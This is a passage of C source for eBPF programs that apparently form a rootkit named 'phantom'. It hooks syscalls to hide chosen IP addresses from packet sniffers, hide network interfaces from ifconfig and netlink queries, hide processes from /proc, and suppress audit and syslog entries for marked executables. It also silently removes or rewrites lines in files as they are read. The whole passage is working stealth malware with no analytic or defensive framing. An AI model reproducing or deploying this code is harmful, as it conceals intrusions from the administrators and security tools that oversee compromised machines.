    __u8 *tracked = bpf_map_lookup_elem(&tracked_netlink_route_fds, &fdkey);
    if (!tracked)
        return 0;

    void *base = read_user_recvmsg_base((void *)ctx->args[1]);
    if (!base)
        return 0;

    struct port_read_ctx r = {
        .buf = base,
        .fd = fd,
    };
    bpf_map_update_elem(&route_recvmsg_enter_cache, &tid, &r, BPF_ANY);
    return 0;
}

/*
 * phantom_recvmsg_exit_route - sys_exit_recvmsg fallback for NETLINK_ROUTE.
 *
 * Same in-place filter as override; cannot shorten return without kretprobe.
 */
SEC("tracepoint/syscalls/sys_exit_recvmsg")
int phantom_recvmsg_exit_route(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING) &&
        !is_config_enabled(CFG_ENABLE_IP_HIDING))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&route_recvmsg_enter_cache, &tid);
    if (!r)
        return 0;
    bpf_map_delete_elem(&route_recvmsg_enter_cache, &tid);

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    __u32 n = (__u32)ret;
    if (n > ROUTE_FILTER_MAX)
        n = ROUTE_FILTER_MAX;

    /* Verify this is actually a NETLINK_ROUTE fd */
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | r->fd;
    __u8 *is_route = bpf_map_lookup_elem(&tracked_netlink_route_fds, &fdkey);
    if (!is_route)
        return 0;

    filter_route_user_buf(r->buf, n);
    return 0;
}

// ============================================================
// AF_PACKET recvmsg filtering - Hide IPs from network sniffers
// ============================================================

/*
 * packet_ip_ctx - Context for filtering AF_PACKET by IP address.
 */
struct packet_ip_ctx {
    char *scratch;
    void *ubuf;
    __u32 n;
};

/*
 * packet_check_ip - Check if a captured packet has hidden src or dst IP.
 * Returns 1 if packet should be hidden, 0 otherwise.
 * Reads only ETH+IP headers (34 bytes minimum).
 */
static __noinline int packet_check_ip(const char *pkt, __u32 pkt_len)
{
    if (pkt_len < ETH_HDR_LEN + IP_HDR_MIN_LEN)
        return 0;

    /* Read EtherType at offset 12 (2 bytes) */
    __be16 ethertype = 0;
    if (bpf_probe_read_kernel(&ethertype, 2, pkt + 12) < 0)
        return 0;

    /* Only handle IPv4 (0x0800) */
    if (ethertype != 0x0008) /* network byte order: 0x0800 = 0x0008 big-endian */
        return 0;

    /* Read IP source address at offset ETH_HDR_LEN + 12 = 26 */
    __be32 saddr = 0;
    if (bpf_probe_read_kernel(&saddr, 4, pkt + ETH_HDR_LEN + 12) < 0)
        return 0;

    if (ip_is_hidden(saddr))
        return 1;

    /* Read IP destination address at offset ETH_HDR_LEN + 16 = 30 */
    __be32 daddr = 0;
    if (bpf_probe_read_kernel(&daddr, 4, pkt + ETH_HDR_LEN + 16) < 0)
        return 0;

    if (ip_is_hidden(daddr))
        return 1;

    return 0;
}

/*
 * af_packet_filter_cb - Zero first 64 bytes of recvmsg buffer when IP is hidden.
 */
static long af_packet_filter_cb(__u32 i, void *ctxp)
{
    struct packet_ip_ctx *c = ctxp;
    (void)i;

    if (c->n < ETH_HDR_LEN + IP_HDR_MIN_LEN)
        return 1;

    /* Read first 34 bytes (Ethernet + IP header) to scratch already done in caller */
    /* We just need to check the IP addresses */
    if (packet_check_ip(c->scratch, c->n)) {
        /* Zero the first 64 bytes of the packet in userspace (not the full frame) */
        char z = 0;
        #pragma unroll
        for (int k = 0; k < 64; k++) {
            if ((__u32)k >= c->n)
                break;
            bpf_probe_write_user((char *)c->ubuf + k, &z, 1);
        }
        emit_ip_hide_event(0); /* packet hidden marker */
    }

    return 1; /* Only one packet per recvmsg */
}

/*
 * phantom_recvmsg_enter_packet - Track AF_PACKET recvmsg buffer.
 */
SEC("tracepoint/syscalls/sys_enter_recvmsg")
int phantom_recvmsg_enter_packet(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IP_HIDING))
        return 0;

    __u32 fd = (__u32)ctx->args[0];
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | fd;

    __u8 *tracked = bpf_map_lookup_elem(&tracked_af_packet_fds, &fdkey);
    if (!tracked)
        return 0;

    void *base = read_user_recvmsg_base((void *)ctx->args[1]);
    if (!base)
        return 0;

    struct port_read_ctx r = {
        .buf = base,
        .fd = fd,
    };
    bpf_map_update_elem(&packet_recvmsg_enter_cache, &tid, &r, BPF_ANY);
    return 0;
}

/*
 * phantom_recvmsg_exit_packet - Filter AF_PACKET responses for hidden IPs.
 */
SEC("tracepoint/syscalls/sys_exit_recvmsg")
int phantom_recvmsg_exit_packet(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IP_HIDING))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&packet_recvmsg_enter_cache, &tid);
    if (!r)
        return 0;
    bpf_map_delete_elem(&packet_recvmsg_enter_cache, &tid);

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    /* Verify this is actually an AF_PACKET fd */
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | r->fd;
    __u8 *is_packet = bpf_map_lookup_elem(&tracked_af_packet_fds, &fdkey);
    if (!is_packet)
        return 0;

    __u32 n = (__u32)ret;
    if (n > 2048)
        n = 2048; /* Cap packet size for bounded processing */

    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
    if (!scratch)
        return 0;

    if (bpf_probe_read_user(scratch, n, r->buf) < 0)
        return 0;

    struct packet_ip_ctx ctx_pkt = {
        .scratch = scratch,
        .ubuf = r->buf,
        .n = n,
    };
    af_packet_filter_cb(0, &ctx_pkt);

    return 0;
}

// Exec capture - sched_process_exec
// ============================================================
/*
 * phantom_exec_capture - sched_process_exec: exec name/path capture and proc hide.
 *
 * Matches hidden_exec_names -> hidden_exec_pids for audit/syslog suppression.
 * Matches hidden_proc_path_prefixes -> hidden_proc_names for /proc hiding.
 *
 * __data_loc_filename: low 16 bits = offset from event start; fname at ctx+off.
 */
SEC("tracepoint/sched/sched_process_exec")
int phantom_exec_capture(struct trace_event_raw_sched_process_exec *ctx)
{
    int do_exec = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    int do_proc = is_config_enabled(CFG_ENABLE_PROCESS_HIDING);
    if (!do_exec && !do_proc)
        return 0;

    /* __data_loc_filename -> fname pointer */
    unsigned short fname_off = ctx->__data_loc_filename & 0xffff;
    const char *fname = (const char *)ctx + fname_off;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = (__u32)(pid_tgid >> 32);

    /* LPM match on exec path -> add PID string to hidden_proc_names */
    if (do_proc) {
        char *buf = get_str_buf();
        if (buf) {
            __builtin_memset(buf, 0, MAX_PROC_PATH_PREFIX_LEN);
            long pn = bpf_probe_read_kernel_str(buf, MAX_PROC_PATH_PREFIX_LEN, fname);

            struct {
                __u32 prefixlen;
                char data[MAX_PROC_PATH_PREFIX_LEN];
            } *k = (void *)(buf + 128);
            __builtin_memset(k, 0, sizeof(*k));
            k->prefixlen = MAX_PROC_PATH_PREFIX_LEN * 8;
            __builtin_memcpy(k->data, buf, MAX_PROC_PATH_PREFIX_LEN);

            if (pn > 0 && bpf_map_lookup_elem(&hidden_proc_path_prefixes, k)) {
                char proc_key[16];
                char rev[10];
                __u32 n = pid;
                int len = 0;

                __builtin_memset(proc_key, 0, sizeof(proc_key));
                if (n == 0) {
                    proc_key[0] = '0';
                } else {
                    while (len < 10 && n > 0) {
                        rev[len++] = (char)('0' + (n % 10));
                        n /= 10;
                    }
                    for (int i = 0; i < len && i < 15; i++)
                        proc_key[i] = rev[len - 1 - i];
                }

                __u8 val = 1;
                bpf_map_update_elem(&hidden_proc_names, proc_key, &val, BPF_ANY);
                emit_hide_event(EVENT_PROCESS_HIDDEN, buf);
            }
        }
    }

    if (!do_exec)
        return 0;

    /* First 15 bytes of basename for hidden_exec_names lookup */
    char name[16];
    __builtin_memset(name, 0, sizeof(name));
    long n = bpf_probe_read_kernel_str(name, sizeof(name), fname);
    if (n <= 0)
        return 0;

    /* Strip trailing newline if present */
    if (n > 1 && name[n - 2] == '\n')
        name[n - 2] = '\0';

    /* Check if this filename prefix is in the capture list */
    __u8 *found = bpf_map_lookup_elem(&hidden_exec_names, name);
    if (!found)
        return 0;

    __u8 val = 1;
    bpf_map_update_elem(&hidden_exec_pids, &pid, &val, BPF_ANY);
    emit_hide_event(EVENT_EXEC_CAPTURED, name);

    return 0;
}

// ============================================================
// FILE CONTENT FILTERING HOOKS
// ============================================================

SEC("tracepoint/syscalls/sys_enter_openat")
int phantom_openat_enter_filefilter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_FILE_FILTER))
        return 0;

    if (is_file_filter_exempt())
        return 0;

    const void *path = (const void *)ctx->args[1];
    char *buf = get_str_buf();
    if (!buf)
        return 0;

    /* Zero-pad path key to match userspace HASH layout */
    __builtin_memset(buf, 0, MAX_FILE_FILTER_PATH);
    long n = bpf_probe_read_user_str(buf, MAX_FILE_FILTER_PATH, path);
    if (n <= 0)
        return 0;

    if (!path_has_filter_rule(buf))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    bpf_map_update_elem(&file_filter_pending, &tid, buf, BPF_ANY);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_openat")
int phantom_openat_exit_filefilter(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_FILE_FILTER))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    long fd = ctx->ret;
    if (fd < 0)
        return 0;

    char *pending = bpf_map_lookup_elem(&file_filter_pending, &tid);
    if (!pending)
        return 0;

    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | ((__u32)fd);
    bpf_map_update_elem(&file_filter_fds, &fdkey, pending, BPF_ANY);
    bpf_map_delete_elem(&file_filter_pending, &tid);

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_read")
int phantom_read_enter_filefilter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_FILE_FILTER))
        return 0;

    if (is_file_filter_exempt())
        return 0;

    __u32 fd = (__u32)ctx->args[0];
    void *buf = (void *)ctx->args[1];
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | fd;

    char *tracked = bpf_map_lookup_elem(&file_filter_fds, &fdkey);
    if (!tracked)
        return 0;

    struct port_read_ctx r = {
        .buf = buf,
        .fd = fd,
    };
    bpf_map_update_elem(&file_filter_read_enter_cache, &tid, &r, BPF_ANY);

    return 0;
}

/*
 * File content filtering on read() - trailing FILE_FILTER_MAX window per read.
 *
 * HIDE removes one matching line via shift + bpf_override_return.
 * Line walks use fixed #pragma unroll (not bpf_loop).
 */
#define FILE_FILTER_MAX 1024
#define FILE_FILTER_LINE_MAX 128

struct file_filter_scan_ctx {
    char *scratch;
    __u32 n;
    struct file_filter_rule *rule;
    void *ubuf;
    __u32 mode;
    __u32 search_len;
    __u32 replace_len;
    __u32 match_count;
};

struct file_filter_shift_ctx {
    char *scratch;
    void *ubuf;
    __u32 dst;
    __u32 src;
    __u32 len;
};

static long file_filter_shift_cb(__u32 i, void *ctxp)
{
    struct file_filter_shift_ctx *c = ctxp;
    __u32 idx = i;

    if (idx >= c->len || idx >= FILE_FILTER_MAX)
        return 1;
    idx &= (FILE_FILTER_MAX - 1);

    __u32 src = c->src + idx;
    __u32 dst = c->dst + idx;
    if (src >= FILE_FILTER_MAX || dst >= FILE_FILTER_MAX)
        return 1;
    src &= (FILE_FILTER_MAX - 1);
    dst &= (FILE_FILTER_MAX - 1);

    char ch = 0;
    if (bpf_probe_read_kernel(&ch, 1, c->scratch + src) < 0)
        return 1;
    c->scratch[dst] = ch;
    bpf_probe_write_user((char *)c->ubuf + dst, &ch, 1);
    return 0;
}

struct file_filter_zero_ctx {
    void *ubuf;
    __u32 from;
    __u32 len;
};

static long file_filter_zero_cb(__u32 i, void *ctxp)
{
    struct file_filter_zero_ctx *c = ctxp;
    if (i >= c->len || i >= FILE_FILTER_MAX)
        return 1;
    char z = 0;
    bpf_probe_write_user((char *)c->ubuf + c->from + i, &z, 1);
    return 0;
}

static __noinline void file_filter_remove_range(char *scratch, void *ubuf,
                                                __u32 *n_inout,
                                                __u32 line_start, __u32 line_end)
{
    __u32 n = *n_inout;
    if (n > FILE_FILTER_MAX)
        n = FILE_FILTER_MAX;
    if (line_end <= line_start || line_start >= n)
        return;
    if (line_end > n)
        line_end = n;

    __u32 drop = line_end - line_start;
    __u32 remain = n - line_end;
    if (remain > 0) {
        struct file_filter_shift_ctx sc = {
            .scratch = scratch,
            .ubuf = ubuf,
            .dst = line_start,
            .src = line_end,
            .len = remain,
        };
        bpf_loop(FILE_FILTER_MAX, file_filter_shift_cb, &sc, 0);
    }
    __u32 new_n = n - drop;
    if (new_n < n) {
        struct file_filter_zero_ctx zc = {
            .ubuf = ubuf, .from = new_n, .len = n - new_n,
        };
        bpf_loop(FILE_FILTER_MAX, file_filter_zero_cb, &zc, 0);
    }
    *n_inout = new_n;
}

static __noinline long file_filter_scan_cb(__u32 i, void *ctxp)
{
    struct file_filter_scan_ctx *c = ctxp;
    __u32 search_len = c->search_len;
    __u32 idx = i;

    if (idx >= FILE_FILTER_MAX)
        return 1;
    idx &= (FILE_FILTER_MAX - 1);
    if (idx + search_len > c->n)
        return 1;

    int match = 1;
    for (__u32 j = 0; j < MAX_FILE_FILTER_SEARCH; j++) {
        if (j >= search_len)
            break;
        __u32 pos = idx + j;
        if (pos >= FILE_FILTER_MAX) {
            match = 0;
            break;
        }
        pos &= (FILE_FILTER_MAX - 1);
        char ch = 0;
        if (bpf_probe_read_kernel(&ch, 1, c->scratch + pos) < 0) {
            match = 0;
            break;
        }
        if (ch != c->rule->search[j]) {
            match = 0;
            break;
        }
    }
    if (!match)
        return 0;

    c->match_count++;

    if (c->mode == FILE_FILTER_MODE_HIDE) {
        __u32 line_start = idx;
        #pragma unroll
        for (int k = 0; k < FILE_FILTER_LINE_MAX; k++) {
            if (line_start == 0)
                break;
            char prev = 0;
            if (bpf_probe_read_kernel(&prev, 1, c->scratch + line_start - 1) < 0)
                break;
            if (prev == '\n')
                break;
            line_start--;
        }

        __u32 line_end = idx;
        #pragma unroll
        for (int k = 0; k < FILE_FILTER_LINE_MAX; k++) {
            if (line_end >= c->n || line_end >= FILE_FILTER_MAX)
                break;
            char cur = 0;
            if (bpf_probe_read_kernel(&cur, 1, c->scratch + line_end) < 0)
                break;
            line_end++;
            if (cur == '\n')
                break;
        }

        file_filter_remove_range(c->scratch, c->ubuf, &c->n, line_start, line_end);
        return 1; /* one removal per window */
    }

    if (c->mode == FILE_FILTER_MODE_REPLACE) {
        __u32 replace_len = c->replace_len;
        if (replace_len == search_len) {
            for (__u32 j = 0; j < MAX_FILE_FILTER_REPLACE; j++) {
                if (j >= replace_len)
                    break;
                __u32 pos = idx + j;
                if (pos >= FILE_FILTER_MAX)
                    break;
                bpf_probe_write_user((char *)c->ubuf + pos,
                                     &c->rule->replace[j], 1);
            }
        }
    }
    return 0;
}

static __noinline __u32 apply_file_filter_window(void *ubuf, __u32 n,
                                                  struct file_filter_rule *rule,
                                                  __u32 *match_count_out)
{
    if (match_count_out)
        *match_count_out = 0;
    if (n == 0 || n > FILE_FILTER_MAX)
        return n;

    __u32 search_len = rule->search_len;
    if (search_len == 0 || search_len > MAX_FILE_FILTER_SEARCH)
        return n;

    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&file_filter_scratch, &key);
    if (!scratch)
        return n;
    if (bpf_probe_read_user(scratch, n, ubuf) < 0)
        return n;

    __u32 scan_limit = (n >= search_len) ? (n - search_len + 1) : 0;
    if (scan_limit > FILE_FILTER_MAX)
        scan_limit = FILE_FILTER_MAX;

    struct file_filter_scan_ctx sc = {
        .scratch = scratch,
        .n = n,
        .rule = rule,
        .ubuf = ubuf,
        .mode = rule->mode,
        .search_len = search_len,
        .replace_len = rule->replace_len,
        .match_count = 0,
    };
    if (scan_limit > 0)
        bpf_loop(FILE_FILTER_MAX, file_filter_scan_cb, &sc, 0);

    if (match_count_out)
        *match_count_out = sc.match_count;
    return sc.n;
}

static __noinline void emit_file_filter_event(__u32 event_type, const char *filepath)
{
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->type = event_type;
    e->pid = (__u32)(pid_tgid >> 32);
    e->tid = (__u32)pid_tgid;
    e->success = 1;
    __builtin_memset(e->comm, 0, sizeof(e->comm));
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->filename, 0, sizeof(e->filename));
    bpf_probe_read_kernel_str(e->filename, sizeof(e->filename), filepath);
    e->inode = 0;
    e->port = 0;
    bpf_ringbuf_submit(e, 0);
}

SEC("kretprobe/__x64_sys_read")
int BPF_KRETPROBE(phantom_read_override_filefilter, long ret)
{
    if (!is_config_enabled(CFG_ENABLE_FILE_FILTER))
        return 0;
    if (ret <= 0)
        return 0;
    if (is_file_filter_exempt())
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&file_filter_read_enter_cache, &tid);
    if (!r)
        return 0;

    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | r->fd;
    char *filepath = bpf_map_lookup_elem(&file_filter_fds, &fdkey);
    if (!filepath)
        return 0;

    struct file_filter_rule *rule = bpf_map_lookup_elem(&file_filter_rules, filepath);
    if (!rule)
        return 0;

    void *ubuf = r->buf;
    bpf_map_delete_elem(&file_filter_read_enter_cache, &tid);

    __u32 win = FILE_FILTER_MAX;
    if ((__u64)ret < win)
        win = (__u32)ret;
    __u32 off = (__u32)ret - win;

    __u32 match_count = 0;
    __u32 new_win = apply_file_filter_window((char *)ubuf + off, win, rule, &match_count);
    __u32 new_total = off + new_win;

    if (match_count > 0) {
        __u32 et = (rule->mode == FILE_FILTER_MODE_HIDE)
                   ? EVENT_FILE_LINE_HIDDEN : EVENT_FILE_REPLACED;
        emit_file_filter_event(et, filepath);
    }

    if (rule->mode == FILE_FILTER_MODE_HIDE && new_total != (__u32)ret)
        bpf_override_return(ctx, new_total);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int phantom_read_exit_filefilter(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_FILE_FILTER))
        return 0;
    __u64 tid = bpf_get_current_pid_tgid();
    bpf_map_delete_elem(&file_filter_read_enter_cache, &tid);
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_close")
int phantom_close_enter_filefilter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_FILE_FILTER))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u32 fd = (__u32)ctx->args[0];
    __u64 fdkey = (pid << 32) | fd;

    bpf_map_delete_elem(&file_filter_fds, &fdkey);
    bpf_map_delete_elem(&file_filter_leftover, &tid);
    bpf_map_delete_elem(&file_filter_read_enter_cache, &tid);

    return 0;
}

// ============================================================
// ioctl SIOCGIFCONF filtering - Interface hiding from ifconfig
// ============================================================

#define IFREQ_SIZE 40       /* sizeof(struct ifreq) on x86_64: ifr_name[16] + ifr_ifru[24] */
#define IFNAMSIZ 16

/*
 * ifreq_scan_ctx - Compact SIOCGIFCONF ifconf buffer in kernel scratch.
 */
struct ifreq_scan_ctx {
    char *scratch;      /* kernel copy of ifconf buffer */
    void *ubuf;         /* userspace ifconf buffer */
    __u32 n;            /* actual bytes written by kernel (from ifc_len) */
    __u32 in_off;       /* read position */
    __u32 out_off;      /* write position (filtered) */
};

/*
 * ifreq_scan_cb - Skip hidden ifreq entries; copy kept entries to out_off.
 */
static long ifreq_scan_cb(__u32 i, void *ctxp)
{
    struct ifreq_scan_ctx *c = ctxp;

    if (c->in_off + IFREQ_SIZE > c->n)
        return 1; /* Past end */

    /* Read interface name (first 16 bytes of ifreq) */
    char ifname[16];
    __builtin_memset(ifname, 0, sizeof(ifname));
    if (bpf_probe_read_kernel(ifname, IFNAMSIZ, c->scratch + c->in_off) < 0) {
        c->in_off += IFREQ_SIZE;
        return 0;
    }

    /* Strip any trailing garbage after null terminator */
    #pragma unroll
    for (int k = 0; k < IFNAMSIZ; k++) {
        if (ifname[k] == '\0')
            break;
    }

    int hide = iface_is_hidden(ifname);

    if (hide) {
        emit_iface_hide_event(ifname);
        /* Skip this entry - don't advance out_off */
    } else {
        /* Copy this entry from kernel scratch to userspace buffer */
        if (c->out_off != c->in_off) {
            #pragma unroll
            for (int k = 0; k < IFREQ_SIZE; k++) {
                char ch = 0;
                if (bpf_probe_read_kernel(&ch, 1, c->scratch + c->in_off + k) < 0)
                    break;
                bpf_probe_write_user((char *)c->ubuf + c->out_off + k, &ch, 1);
            }
        }
        c->out_off += IFREQ_SIZE;
    }

    c->in_off += IFREQ_SIZE;
    return 0;
}

#define IFCONF_MAX_ENTRIES 128
#define IFCONF_MAX_BUF (IFREQ_SIZE * IFCONF_MAX_ENTRIES) /* 4096 */

/*
 * phantom_ioctl_enter - sys_enter_ioctl: cache SIOCGIFCONF buffer pointer.
 *
 * x86_64 ifconf: ifc_len@0, ifc_buf@8.
 */
SEC("tracepoint/syscalls/sys_enter_ioctl")
int phantom_ioctl_enter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    unsigned int cmd = (unsigned int)ctx->args[1];
    if (cmd != SIOCGIFCONF)
        return 0;

    void *argp = (void *)ctx->args[2];
    if (!argp)
        return 0;

    /* ifconf layout: ifc_len then ifc_buf pointer */
    int ifc_len = 0;
    void *ifc_buf = NULL;
    if (bpf_probe_read_user(&ifc_len, sizeof(ifc_len), argp) < 0)
        return 0;
    if (bpf_probe_read_user(&ifc_buf, sizeof(ifc_buf), (char *)argp + 8) < 0)
        return 0;

    if (!ifc_buf || ifc_len <= 0)
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct ioctl_ifconf_data data = {
        .ifconf_ptr = argp,
        .buf = ifc_buf,
        .maxlen = (__u32)ifc_len,
    };
    bpf_map_update_elem(&ioctl_enter_cache, &tid, &data, BPF_ANY);
    return 0;
}

/*
 * phantom_ioctl_exit - sys_exit_ioctl: drop hidden ifreq entries, update ifc_len.
 */
SEC("tracepoint/syscalls/sys_exit_ioctl")
int phantom_ioctl_exit(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    if (ctx->ret != 0)
        return 0; /* ioctl failed */

    __u64 tid = bpf_get_current_pid_tgid();
    struct ioctl_ifconf_data *data = bpf_map_lookup_elem(&ioctl_enter_cache, &tid);
    if (!data)
        return 0;

    void *ubuf = data->buf;
    void *ifconf_ptr = data->ifconf_ptr;
    bpf_map_delete_elem(&ioctl_enter_cache, &tid);

    /* Read back the kernel-updated ifc_len (actual bytes written) */
    int actual_len = 0;
    if (bpf_probe_read_user(&actual_len, sizeof(actual_len), ifconf_ptr) < 0)
        actual_len = data->maxlen;

    __u32 n = (__u32)actual_len;
    if (n > IFCONF_MAX_BUF)
        n = IFCONF_MAX_BUF;

    if (n < IFREQ_SIZE)
        return 0;

    /* Copy userspace buffer to kernel scratch for scanning */
    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&route_filter_scratch, &key);
    if (!scratch)
        return 0;

    if (bpf_probe_read_user(scratch, n, ubuf) < 0)
        return 0;

    struct ifreq_scan_ctx scan = {
        .scratch = scratch,
        .ubuf = ubuf,
        .n = n,
        .in_off = 0,
        .out_off = 0,
    };

    bpf_loop(IFCONF_MAX_ENTRIES, ifreq_scan_cb, &scan, 0);

    /* Update ifc_len to reflect filtered buffer size */
    int new_len = (int)scan.out_off;
    bpf_probe_write_user(ifconf_ptr, &new_len, sizeof(new_len));

    if (scan.out_off < n) {
        /* Zero tail past new ifc_len so old ifnames are not visible */
        zero_user_range(ubuf, scan.out_off, n);
    }

    return 0;
}
